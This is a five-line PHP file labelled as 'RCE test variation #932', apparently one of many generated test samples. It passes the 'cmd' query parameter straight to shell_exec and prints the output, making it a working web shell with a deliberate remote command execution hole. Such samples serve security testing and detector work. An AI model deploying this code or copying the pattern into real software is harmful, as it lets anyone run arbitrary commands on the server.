<?php
// RCE test variation #932
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>